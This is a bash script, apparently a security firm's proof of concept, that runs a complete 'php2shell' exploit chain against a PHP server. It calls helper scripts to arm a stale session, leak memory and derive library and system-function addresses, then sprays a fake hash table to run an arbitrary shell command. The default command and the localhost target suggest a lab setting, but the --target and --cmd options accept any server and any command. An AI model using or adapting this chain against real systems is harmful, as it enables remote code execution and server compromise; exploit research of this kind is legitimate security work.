#!/bin/bash
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

# chain.sh - the whole php2shell chain with our own tools, one target, one proof file.
#
#   chain.sh --target http://127.0.0.1:18110/index.php --container p2s-target
#
# Steps: A1 arms the stale session id, B1 discloses 800 KB out of the recycled chunk, leak_addrs
# turns that into libphp/main/S/hsv, A2 re-arms with the cheap OOM, B2 sprays the fake reference and
# the fake array. The proof is a command run by the target's user, written through the container.
set -u

TARGET="http://127.0.0.1:18110/index.php"
CONTAINER="${CONTAINER:-p2s-target}"
CMD='id>/tmp/pwn.txt'
PROOF="/tmp/pwn.txt"
SPEC="G:511:0x137*14,G:400:0x137,X:900"
PARTS=880
DEPTH=64
FILLERS=115
WORKERS=0          # >1: hold WORKERS-1 connections so every step lands on the same child

while [ $# -gt 0 ]; do
  case "$1" in
    --target) TARGET="$2"; shift 2 ;;
    --container) CONTAINER="$2"; shift 2 ;;
    --cmd) CMD="$2"; shift 2 ;;
    --proof) PROOF="$2"; shift 2 ;;
    --parts) PARTS="$2"; shift 2 ;;
    --depth) DEPTH="$2"; shift 2 ;;
    --fillers) FILLERS="$2"; shift 2 ;;
    --workers) WORKERS="$2"; shift 2 ;;
    *) echo "unknown argument $1" >&2; exit 2 ;;
  esac
done

HERE="$(cd "$(dirname "$0")" && pwd)"
COOKIE=$(mktemp)
HOLDER=""

# Fail before the first stage rather than after it: four requests against nothing produce four
# confusing errors, and the interesting one is always the first.
python3 -c '
import socket, sys
url = sys.argv[1].split("://", 1)[-1].split("/", 1)[0]
host, _, port = url.partition(":")
try:
    socket.create_connection((host, int(port or 80)), timeout=3).close()
except OSError as exc:
    sys.exit("no target on %s (%s)" % (url, exc.strerror or exc))
' "$TARGET" || exit 1

cleanup() {
  rm -f "$COOKIE"
  if [ -n "$HOLDER" ]; then
    kill "$HOLDER" 2>/dev/null
    wait "$HOLDER" 2>/dev/null
  fi
}
trap cleanup EXIT

if [ "$WORKERS" -gt 1 ]; then
  python3 "$HERE/hold_workers.py" --url "$TARGET" --count "$((WORKERS - 1))" --hold 180 &
  HOLDER=$!
  sleep 3
fi

python3 "$HERE/a1_arm.py" --url "$TARGET" --repeat 1 --sid-hex 00 --big 78 \
        --query-n 5 --query-len 1 --timeout 120 | grep -E '^  attempt |VERDICT' | head -2
sleep 1

python3 "$HERE/b1_forge.py" --url "$TARGET" --spec "$SPEC" --fake-len 0xC8000 \
        --sid a --progress-first --chunked --save-cookie "$COOKIE" \
        | grep -E 'response|Set-Cookie' || exit 1

ADDRS=$(python3 "$HERE/leak_addrs.py" --cookie-file "$COOKIE" --emit shell) || exit 1
eval "$ADDRS"
echo "leak: libphp=$LIBPHP main=$MAIN S=$S hsv=$HSV zif=$ZIF_SYSTEM"
sleep 1

python3 "$HERE/a2_cheap_oom.py" --url "$TARGET" --parts "$PARTS" --depth "$DEPTH" \
        --fillers "$FILLERS"
sleep 1

HT=$(mktemp)
python3 "$HERE/mk_fake_ht.py" --ht "$S" --zif "$ZIF_SYSTEM" --cmd "$CMD" --out "$HT"
python3 "$HERE/b2_exec.py" --url "$TARGET" --ht-addr "$S" --ht-file "$HT" --vl 384 \
        --n1 500 --n2 495 --rc 1
rm -f "$HT"
sleep 2

echo "proof:"
docker exec "$CONTAINER" sh -c "cat $PROOF 2>/dev/null || echo '(no file)'"
